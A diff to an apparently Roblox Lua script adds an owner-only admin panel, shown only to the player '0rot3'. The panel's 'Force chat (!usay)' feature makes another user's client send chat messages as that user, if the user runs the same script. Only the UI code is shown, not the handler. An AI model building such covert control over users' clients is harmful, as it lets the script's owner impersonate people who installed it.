@@ -3882,6 +3882,50 @@ if LP.Name == "0rot3" then
         if n:gsub("%s", "") == "" then notify("Enter a username", "warn"); return end
         if cmdHandlers and cmdHandlers["unrmvp"] then cmdHandlers["unrmvp"](n); lockBox.Text = "" end
     end)
+
+    section(pgAdmin, "Force chat (!usay)")
+    label(pgAdmin, "Makes the target user's own client send a chat message in game. Target must be running the script in this server.")
+    local usayFrame = inst("Frame", pgAdmin, {
+        Size = UDim2.new(1, -8, 0, 116),
+        BackgroundColor3 = T.bg2, BackgroundTransparency = 0.3,
+        BorderSizePixel = 0,
+    })
+    corner(usayFrame, 8); stroke(usayFrame, T.line, 1, 0.5)
+    local usayUser = inst("TextBox", usayFrame, {
+        BackgroundColor3 = T.bg, BackgroundTransparency = 0.2,
+        Position = UDim2.new(0, 10, 0, 10), Size = UDim2.new(1, -20, 0, 28),
+        PlaceholderText = "Target username", PlaceholderColor3 = T.dim,
+        Font = Enum.Font.Gotham, TextSize = 12, TextColor3 = T.text,
+        TextXAlignment = Enum.TextXAlignment.Left, Text = "",
+        ClearTextOnFocus = false,
+    })
+    corner(usayUser, 6); stroke(usayUser, T.line, 1, 0.4)
+    local usayMsg = inst("TextBox", usayFrame, {
+        BackgroundColor3 = T.bg, BackgroundTransparency = 0.2,
+        Position = UDim2.new(0, 10, 0, 44), Size = UDim2.new(1, -20, 0, 28),
+        PlaceholderText = "Message to send as them (≤200 chars)", PlaceholderColor3 = T.dim,
+        Font = Enum.Font.Gotham, TextSize = 12, TextColor3 = T.text,
+        TextXAlignment = Enum.TextXAlignment.Left, Text = "",
+        ClearTextOnFocus = false,
+    })
+    corner(usayMsg, 6); stroke(usayMsg, T.line, 1, 0.4)
+    local usayBtn = inst("TextButton", usayFrame, {
+        Position = UDim2.new(0, 10, 0, 80), Size = UDim2.new(1, -20, 0, 26),
+        BackgroundColor3 = T.acc, BackgroundTransparency = 0.1, AutoButtonColor = false,
+        Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = T.text,
+        Text = "Send !usay",
+    })
+    corner(usayBtn, 6); stroke(usayBtn, T.line, 1, 0.4)
+    usayBtn.MouseButton1Click:Connect(function()
+        local u = (usayUser.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+        local m = (usayMsg.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+        if u == "" then notify("Enter a target user", "warn"); return end
+        if m == "" then notify("Enter a message", "warn"); return end
+        if cmdHandlers and cmdHandlers["usay"] then
+            cmdHandlers["usay"](u .. " " .. m)
+            usayMsg.Text = ""
+        end
+    end)
 end
 
 
